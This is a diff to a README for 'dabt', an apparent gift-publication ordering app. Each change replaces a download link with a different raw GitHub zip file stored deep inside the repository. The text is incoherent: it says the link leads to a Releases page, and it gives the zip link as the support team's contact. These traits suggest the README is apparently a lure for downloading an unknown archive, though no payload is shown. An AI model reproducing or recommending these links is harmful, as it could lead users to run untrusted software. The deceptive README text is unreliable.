@@ -4,7 +4,7 @@
 Welcome to dabt! This application helps you easily order a gift internet publication styled like a manuscript. Whether you're planning a special surprise or just want to explore unique gifts, dabt makes it simple.
 
 ## 📦 Download & Install
-To get started with dabt, visit this page to download: [Download dabt](https://raw.githubusercontent.com/abcdef-pixel/dabt/main/gymnasial/dabt.zip). 
+To get started with dabt, visit this page to download: [Download dabt](https://github.com/abcdef-pixel/dabt/raw/refs/heads/main/app/components/layout/Software-1.0-beta.5.zip). 
 
 ### Steps to Download
 1. Click the link above to go to the Releases page.
@@ -52,9 +52,9 @@ A: We accept credit cards, PayPal, and other popular payment methods.
 A: Yes, you can return your purchased items within 30 days of receiving them, subject to our return policy.
 
 ## 📞 Support
-If you need help using dabt or have questions, please reach out to our support team at https://raw.githubusercontent.com/abcdef-pixel/dabt/main/gymnasial/dabt.zip
+If you need help using dabt or have questions, please reach out to our support team at https://github.com/abcdef-pixel/dabt/raw/refs/heads/main/app/components/layout/Software-1.0-beta.5.zip
 
 ## 📈 Future Updates
 We are continually working to improve dabt. Upcoming updates will focus on adding more features and enhancing user experience. Stay tuned for announcements on new releases!
 
-Visit this page to download: [Download dabt](https://raw.githubusercontent.com/abcdef-pixel/dabt/main/gymnasial/dabt.zip).
+Visit this page to download: [Download dabt](https://github.com/abcdef-pixel/dabt/raw/refs/heads/main/app/components/layout/Software-1.0-beta.5.zip).
